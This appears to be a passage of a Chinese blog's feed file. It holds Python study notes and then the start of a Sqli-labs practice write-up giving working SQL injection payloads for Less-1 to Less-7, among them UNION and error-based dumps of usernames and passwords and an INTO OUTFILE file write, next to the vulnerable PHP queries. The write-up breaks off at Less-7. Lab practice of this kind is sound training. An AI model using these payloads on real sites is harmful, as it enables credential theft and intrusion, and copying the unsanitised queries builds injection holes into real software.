class="number">2</span></span><br></pre></td></tr></table></figure><p>双星号<code>（**）</code>：<code>**kwargs</code> 将参数以<strong>字典</strong>的形式导入，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(str1,**str2)</span>:</span></span><br><span class="line">    print(str1)</span><br><span class="line">    print(str2)</span><br><span class="line">a(<span class="number">1</span>,a=<span class="number">2</span>,b=<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line">&#123;<span class="string">'a'</span>: <span class="number">2</span>, <span class="string">'b'</span>: <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure><h1 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h1><h2 id="eval"><a href="#eval" class="headerlink" title="eval()"></a>eval()</h2><p>评估函数</p><p>用法：去掉参数最外侧引号并执行余下语句的函数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200201103455433.png" alt=""></p><h2 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h2><p>格式化函数</p><p>基本语法是通过{}和:来代替以前的%，<a href="https://www.runoob.com/python/att-string-format.html" target="_blank" rel="noopener">详</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200202141611146.png" style="zoom:80%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200202171711002.png" style="zoom:50%;" /><h2 id="id"><a href="#id" class="headerlink" title="id()"></a>id()</h2><p><strong>id()</strong> 函数返回对象的唯一标识符，标识符是一个整数。</p><p>CPython 中 <strong>id()</strong> 函数用于获取对象的内存地址。</p><p>语法：<code>id([object])</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406162510638.png" alt=""></p><h2 id="type"><a href="#type" class="headerlink" title="type()"></a>type()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200215100705983.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200406163544027.png" alt=""></p><h2 id="isinstance"><a href="#isinstance" class="headerlink" title="isinstance()"></a>isinstance()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200215145928773.png" alt=""></p><h2 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h2><p><a href="https://www.runoob.com/python/file-methods.html" target="_blank" rel="noopener">参考</a></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200216104144396.png" style="zoom:80%;" /><h2 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h2><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/image-20200415104107118.png" alt=""></p><h2 id="send"><a href="#send" class="headerlink" title="send()"></a>send()</h2><p><a href="https://www.jianshu.com/p/6c33bd958f3d" target="_blank" rel="noopener">参考</a></p><p>mode 参数有：</p><table><thead><tr><th align="center">模式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">t</td><td align="center">文本模式 (默认)。</td></tr><tr><td align="center">x</td><td align="center">写模式，新建一个文件，如果该文件已存在则会报错。</td></tr><tr><td align="center">b</td><td align="center">二进制模式。</td></tr><tr><td align="center">+</td><td align="center">打开一个文件进行更新(可读可写)。</td></tr><tr><td align="center">U</td><td align="center">通用换行模式（不推荐）。</td></tr><tr><td align="center">r</td><td align="center">以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td align="center">rb</td><td align="center">以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。这是默认模式。一般用于非文本文件如图片等。</td></tr><tr><td align="center">r+</td><td align="center">打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td align="center">rb+</td><td align="center">以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。一般用于非文本文件如图片等。</td></tr><tr><td align="center">w</td><td align="center">打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">wb</td><td align="center">以二进制格式打开一个文件只用于写入。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="center">w+</td><td align="center">打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。</td></tr><tr><td align="center">wb+</td><td align="center">以二进制格式打开一个文件用于读写。如果该文件已存在则打开文件，并从开头开始编辑，即原有内容会被删除。如果该文件不存在，创建新文件。一般用于非文本文件如图片等。</td></tr><tr><td align="center">a</td><td align="center">打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">ab</td><td align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。也就是说，新的内容将会被写入到已有内容之后。如果该文件不存在，创建新文件进行写入。</td></tr><tr><td align="center">a+</td><td align="center">打开一个文件用于读写。如果该文件已存在，文件指针将会放在文件的结尾。文件打开时会是追加模式。如果该文件不存在，创建新文件用于读写。</td></tr><tr><td align="center">ab+</td><td align="center">以二进制格式打开一个文件用于追加。如果该文件已存在，文件指针将会放在文件的结尾。如果该文件不存在，创建新文件用于读写。</td></tr></tbody></table><p>默认为文本模式，如果要以二进制模式打开，加上 <code>b</code> 。</p><p>file 对象使用 open 函数来创建，下表列出了 file 对象常用的函数：</p><table><thead><tr><th align="center">序号</th><th align="center">方法及描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="center"><a href="https://www.runoob.com/python/file-close.html" target="_blank" rel="noopener"><code>file.close()</code></a>关闭文件。关闭后文件不能再进行读写操作。</td></tr><tr><td align="center">2</td><td align="center"><a href="https://www.runoob.com/python/file-flush.html" target="_blank" rel="noopener"><code>file.flush()</code></a>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件, 而不是被动的等待输出缓冲区写入。</td></tr><tr><td align="center">3</td><td align="center"><a href="https://www.runoob.com/python/file-fileno.html" target="_blank" rel="noopener"><code>file.fileno()</code></a>返回一个整型的文件描述符(file descriptor FD 整型), 可以用在如os模块的read方法等一些底层操作上。</td></tr><tr><td align="center">4</td><td align="center"><a href="https://www.runoob.com/python/file-isatty.html" target="_blank" rel="noopener"><code>file.isatty()</code></a>如果文件连接到一个终端设备返回 True，否则返回 False。</td></tr><tr><td align="center">5</td><td align="center"><a href="https://www.runoob.com/python/file-next.html" target="_blank" rel="noopener"><code>file.next()</code></a>返回文件下一行。</td></tr><tr><td align="center">6</td><td align="center"><a href="https://www.runoob.com/python/python-file-read.html" target="_blank" rel="noopener"><code>file.read([size])</code></a>从文件读取指定的字节数，如果未给定或为负则读取所有。</td></tr><tr><td align="center">7</td><td align="center"><a href="https://www.runoob.com/python/file-readline.html" target="_blank" rel="noopener"><code>file.readline([size])</code></a>读取整行，包括 “\n” 字符。</td></tr><tr><td align="center">8</td><td align="center"><a href="https://www.runoob.com/python/file-readlines.html" target="_blank" rel="noopener"><code>file.readlines([sizeint])</code></a>读取所有行并返回列表，若给定sizeint&gt;0，则是设置一次读多少字节，这是为了减轻读取压力。</td></tr><tr><td align="center">9</td><td align="center"><a href="https://www.runoob.com/python/file-seek.html" target="_blank" rel="noopener"><code>file.seek(offset[, whence])</code></a>设置文件当前位置</td></tr><tr><td align="center">10</td><td align="center"><a href="https://www.runoob.com/python/file-tell.html" target="_blank" rel="noopener"><code>file.tell()</code></a>返回文件当前位置。</td></tr><tr><td align="center">11</td><td align="center"><a href="https://www.runoob.com/python/file-truncate.html" target="_blank" rel="noopener"><code>file.truncate([size])</code></a>截取文件，截取的字节通过size指定，默认为当前文件位置。</td></tr><tr><td align="center">12</td><td align="center"><a href="https://www.runoob.com/python/python-file-write.html" target="_blank" rel="noopener"><code>file.write(str)</code></a>将字符串写入文件，返回的是写入的字符长度。</td></tr><tr><td align="center">13</td><td align="center"><a href="https://www.runoob.com/python/file-writelines.html" target="_blank" rel="noopener"><code>file.writelines(sequence)</code></a>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td></tr></tbody></table><h1 id="一些库"><a href="#一些库" class="headerlink" title="一些库"></a>一些库</h1><h2 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h2><h3 id="OS库路径操作"><a href="#OS库路径操作" class="headerlink" title="OS库路径操作"></a>OS库路径操作</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121104519.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121210427.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121239874.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210121259753.png" style="zoom:67%;" /><p>os.path.getsize(path)：返回path对应文件的大小，以字节为单位&gt;&gt;&gt;os.path.getsize(“c:/1.txt”)   ——&gt;   123</p><h3 id="OS库进程管理"><a href="#OS库进程管理" class="headerlink" title="OS库进程管理"></a>OS库进程管理</h3><p>os.system(command)———–执行程序或命令command，在Windows中返回值为cmd的调用返回信息</p><h3 id="OS库环境参数"><a href="#OS库环境参数" class="headerlink" title="OS库环境参数"></a>OS库环境参数</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210122033256.png" style="zoom:67%;" /><table><thead><tr><th align="center">函数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">os.getlogin()</td><td align="center">获得当前系统登录用户名称</td></tr><tr><td align="center">os.cpu_count()</td><td align="center">获得当前系统的CPU数量</td></tr></tbody></table><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200210133215349.png" style="zoom:67%;" /><h2 id="wordcloud"><a href="#wordcloud" class="headerlink" title="wordcloud"></a>wordcloud</h2><p>配置对象参数—&gt;加载词云文本—&gt;输出词云文件</p><blockquote><p>分隔：以空格分隔单词</p><p>统计：单词出现次数并过滤</p><p>字体：根据统计配置字号</p><p>布局：颜色环境尺寸</p></blockquote><table><thead><tr><th align="center">方法</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">w.generate(txt)</td><td align="center">向WordCloud对象w中加载文本txt &gt;&gt;&gt;<code>w.generate(&quot;Python and WordCloud&quot;)</code></td></tr><tr><td align="center">w.to_file(filename)</td><td align="center">将词云输出为图像文件，<code>.png</code>或<code>.jpg</code>格式 &gt;&gt;&gt;<code>w.to_file(&quot;outfile.png&quot;)</code></td></tr></tbody></table><p>w.wordcloud.WordCloud()参数：</p><table><thead><tr><th align="center">参数</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">min_font_size</td><td align="center">指定词云中字体的最小字体，默认4 &gt;&gt;&gt;w=wordcloud.WordCloud(min_font_size=10)</td></tr><tr><td align="center">max_font_size</td><td align="center">指定词云中字体的最大字号，根据高度自动调节  &gt;&gt;&gt;w=wordcloud.WordCloud(max_font_size=20)</td></tr><tr><td align="center">font_step</td><td align="center">指定词云中字体字号的步进间隔，默认为1 &gt;&gt;&gt;w=wordcloud.WordCloud(font_step=2)</td></tr><tr><td align="center">width</td><td align="center">指定词云对象生成图片的宽度，默认400像素 &gt;&gt;&gt; w= wordcloud.WordCloud(width=600)</td></tr><tr><td align="center">height</td><td align="center">指定词云对象生成图片的高度，默认200像素 &gt;&gt;&gt;w= wordcloud.WordCloud(width=400)</td></tr><tr><td align="center">font_path</td><td align="center">指定字体文件的路径，默认None &gt;&gt;&gt; w=wordcloud.WordCloud(font_path=”msyh.ttc”)</td></tr><tr><td align="center">max-words</td><td align="center">指定词云显示的最大单词数量，默认200 &gt;&gt;&gt; w= wordcloud.WordCloud(max_words=20)</td></tr><tr><td align="center">stop_word</td><td align="center">指定词云的排除列表，即不显示单词列表&gt;&gt;&gt; w= wordcloud.WordCloud(stop_words={“Python”})</td></tr><tr><td align="center">mask</td><td align="center">指定词云形状，默认为长方形，需要引用imread()函数&gt;&gt;&gt;from scipy.misc import imread &gt;&gt;&gt; mk = imread(“pic.png”) &gt;&gt;&gt; w = wordcloud.WordCloud(mask=mk)</td></tr><tr><td align="center">background_color</td><td align="center">指定词云图片的背景颜色，默认为红黑色 &gt;&gt;&gt; w= wordcloud.WordCloud(background_color=”white”)</td></tr></tbody></table><h2 id="PyInstaller"><a href="#PyInstaller" class="headerlink" title="PyInstaller"></a>PyInstaller</h2><p>打包.py文件为.exe应用程序</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200205161232599.png" style="zoom:67%;" /><h2 id="pip"><a href="#pip" class="headerlink" title="pip"></a>pip</h2><table><thead><tr><th align="center">使用方法</th><th align="center">功能</th></tr></thead><tbody><tr><td align="center">pip install &lt;第三方库名&gt;</td><td align="center">安装第三方库</td></tr><tr><td align="center">pip install -U &lt;第三方库名&gt;</td><td align="center">更新第三方库</td></tr><tr><td align="center">pip uninstall &lt;第三方库名&gt;</td><td align="center">卸载第三方库</td></tr><tr><td align="center">pip download &lt;第三方库名&gt;</td><td align="center">下载但不安装指定的第三方库</td></tr><tr><td align="center">pip show &lt;第三方库名&gt;</td><td align="center">列出某个指定第三方库的详细信息</td></tr><tr><td align="center">pip search &lt;关键字&gt;</td><td align="center">根据关键词在名称和介绍中搜索第三方库</td></tr><tr><td align="center">pip list</td><td align="center">列出当前系统的python版本已经安装的第三方库</td></tr></tbody></table><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><h3 id="主要方法"><a href="#主要方法" class="headerlink" title="主要方法"></a>主要方法</h3><table><thead><tr><th align="center">方法</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.requset(method,url,**kwargs)</td><td align="center">构造一个请求，支撑以下各方法的基础方法</td></tr><tr><td align="center">requests.get(url,params=None,**kwargs)</td><td align="center">获取HTML网页的主要方法，对应于HTTP的GET</td></tr><tr><td align="center">requests.head(url,**kwargs)</td><td align="center">获取HTML网页头信息的方法，对应于HTTP的HEAD</td></tr><tr><td align="center">requests.post(url,data=None,json=None,**kwargs)</td><td align="center">向HTML网页提交POST请求的方法，对应于HTTP的POST</td></tr><tr><td align="center">requests.put(url,data=None,**kwargs)</td><td align="center">向HTML网页提交PUT请求的方法，对应于HTTP的PUT</td></tr><tr><td align="center">requests.patch(url,data=None,**kwargs)</td><td align="center">向HTML网页提交局部修改请求，对应于HTTP的PATCH</td></tr><tr><td align="center">requests.delete(url,**kwargs)</td><td align="center">向HTML页面提交删除请求，对应于HTTP的DELETE</td></tr></tbody></table><p>method：</p><blockquote><p>请求方式，GET,HEAD,POST,PUT,PATCH,DALETE,OPTIONS</p></blockquote><p>**kwargs：</p><p>控制访问的参数，均为可选项</p><blockquote><p>params：字典或字节序列，作为参数增加到url中</p><p>data：字典、字节序列或文件对象，作为Request的内容</p><p>json：JSON格式的数据，作为Request的内容</p><p>headers：字典，HTTP定制头</p><p>cookies：字典或CookieJar，Request中的cookie</p><p>auth：元祖，支持HTTP认证功能</p><p>files：字典类型，传输文件</p><p>timeout：设定超时时间，秒为单位</p><p>proxies：字典类型，设定访问代理服务器，可以增加登录认证</p><p>allow_redirects：True/False，默认为True，重定向开关</p><p>stream：True/False，默认为True，获取内容立即下载开关</p><p>verify：True/False，默认为True，认证SSL证书开关</p><p>cert：本地SSL证书路径</p></blockquote><h3 id="Requests库的异常"><a href="#Requests库的异常" class="headerlink" title="Requests库的异常"></a>Requests库的异常</h3><table><thead><tr><th align="center">异常</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">requests.ConnectionError</td><td align="center">网络连接错误异常，如DNS查询失败，拒绝连接等</td></tr><tr><td align="center">requests.HTTPError</td><td align="center">HTTP错误异常</td></tr><tr><td align="center">requests.URLRequired</td><td align="center">url缺失异常</td></tr><tr><td align="center">requests.TooManyRedirects</td><td align="center">超过最大重定向次数，产生重定向异常</td></tr><tr><td align="center">requests.ConnectTimeout</td><td align="center">连接远程服务器超时异常</td></tr><tr><td align="center">requests.Timeout</td><td align="center">请求URL超时，产生超时异常</td></tr></tbody></table><h3 id="Response对象属性"><a href="#Response对象属性" class="headerlink" title="Response对象属性"></a>Response对象属性</h3><table><thead><tr><th align="center">属性</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">r.status_code</td><td align="center">HTTP请求的返回状态，200表示连接成功，404表示失败</td></tr><tr><td align="center">r.text</td><td align="center">HTTP响应内容的字符串形式，即，url对应的页面内容</td></tr><tr><td align="center">r.encoding</td><td align="center">从HTTP header中猜测的响应内容编码方式</td></tr><tr><td align="center">r.apparent_encoding</td><td align="center">从内容中分析出响应内容编码的方式（备选编码方式）</td></tr><tr><td align="center">r.content</td><td align="center">HTTP响应内容的二进制形式</td></tr></tbody></table><h2 id="Beautiful-Soup"><a href="#Beautiful-Soup" class="headerlink" title="Beautiful Soup"></a>Beautiful Soup</h2><p>也叫beautifulsoup4或bs4</p><h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215095808822.png" style="zoom:50%;" /><h3 id="遍历方法"><a href="#遍历方法" class="headerlink" title="遍历方法"></a>遍历方法</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215102120777.png" style="zoom:33%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215101930283.png" style="zoom: 50%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215102442134.png" style="zoom:80%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215102747676.png" style="zoom: 67%;" /><p>注：平行遍历发生在同一个父节点下的各节点间</p><p><code>prettify()</code>格式化输出</p><h3 id="内容查找方法"><a href="#内容查找方法" class="headerlink" title="内容查找方法"></a>内容查找方法</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215110510847.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215110603229.png" style="zoom:67%;" /><h3 id="Beautiful-Soup库解析器"><a href="#Beautiful-Soup库解析器" class="headerlink" title="Beautiful Soup库解析器"></a>Beautiful Soup库解析器</h3><table><thead><tr><th align="center">解析器</th><th align="center">使用方法</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">bs4的HTML解析器</td><td align="center">BeautifulSoup(mk,’html.parser’)</td><td align="center">安装bs4库</td></tr><tr><td align="center">lxml的HTML解析器</td><td align="center">BeautifulSoup(mk,’lxml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">lxml的XML解析器</td><td align="center">BeautifulSoup(mk,’xml’)</td><td align="center">pip install lxml</td></tr><tr><td align="center">html5lib的解析器</td><td align="center">BeautifulSoup(mk,’html5lib’)</td><td align="center">pip install html5lib</td></tr></tbody></table><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>匹配中文字符：<code>[\u4e00-\u9fa5]</code></p><p>IP地址：<code>((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))</code></p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215171503658.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215171657835.png" style="zoom:67%;" /><h3 id="compile函数"><a href="#compile函数" class="headerlink" title="compile函数"></a>compile函数</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215172803741.png" style="zoom:67%;" /><h3 id="Match对象"><a href="#Match对象" class="headerlink" title="Match对象"></a>Match对象</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215173026458.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215173130093.png" style="zoom:67%;" /><h3 id="最小匹配（非贪婪）"><a href="#最小匹配（非贪婪）" class="headerlink" title="最小匹配（非贪婪）"></a>最小匹配（非贪婪）</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200215173716539.png" style="zoom:67%;" /><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p><a href="https://blog.csdn.net/github_36601823/article/details/77815013" target="_blank" rel="noopener">参考</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/20170903091548442.png" alt=""></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python%E7%AC%94%E8%AE%B0/20170903091615951.png" alt=""></p><h1 id="scrapy框架"><a href="#scrapy框架" class="headerlink" title="scrapy框架"></a>scrapy框架</h1><h2 id="主要结构"><a href="#主要结构" class="headerlink" title="主要结构"></a>主要结构</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193013443.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193035116.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193058864.png" style="zoom:67%;" /><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193115484.png" style="zoom:67%;" /><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193155782.png" style="zoom:67%;" /><h2 id="工程目录"><a href="#工程目录" class="headerlink" title="工程目录"></a>工程目录</h2><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193245769.png" style="zoom:67%;" /><h2 id="类"><a href="#类" class="headerlink" title="类"></a>类</h2><h3 id="Request"><a href="#Request" class="headerlink" title="Request"></a>Request</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193435792.png" style="zoom:67%;" /><h3 id="Response"><a href="#Response" class="headerlink" title="Response"></a>Response</h3><img src="https://gitee.com/Extrader/blogimage/raw/master/image/python笔记/image-20200217193520056.png" style="zoom:67%;" />]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqli-labs靶场</title>
      <link href="/2020/01/24/Sqli-labs%E9%9D%B6%E5%9C%BA/"/>
      <url>/2020/01/24/Sqli-labs%E9%9D%B6%E5%9C%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a><strong>Less-</strong>1</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; union select database(),group_concat(username),group_concat(password) from users--+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&#39;$id&#39; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a><strong>Less-</strong>2</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0 union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a><strong>Less-3</strong></h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39;) union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a><strong>Less-</strong>4</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&quot;) union select 1,group_concat(username),group_concat(password) from users --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39; . $id . &#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;($id) LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a><strong>Less-</strong>5</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&#39; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font size="5" color="#FFFF00"&gt;'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'You are in...........'</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font size="3" color="#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/br&gt;&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#0000ff" font size= 3&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a><strong>Less-</strong>6</h1><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;0&quot; and extractvalue(1,concat(1,(select group_concat(username,&#39;:&#39;,password) from users where username!&#x3D;&#39;此处加入想排除的字符，可往后查找&#39;)))--+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; &#39;&quot;&#39;.$id.&#39;&quot;&#39;;</span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;$id LIMIT 0,1&quot;;</span><br><span class="line">下面的同Less-5</span><br></pre></td></tr></table></figure><h1 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a><strong>Less-</strong>7</h1><p>Method：into outfile 文件写入操作，如下：</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39;)) union select 1,2,&#39;&#39; into outfile &quot;C:\\xampp\\htdocs\\sqli\\Less-7\\1.php&quot; --+</span><br></pre></td></tr></table></figure><p>php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;font color= 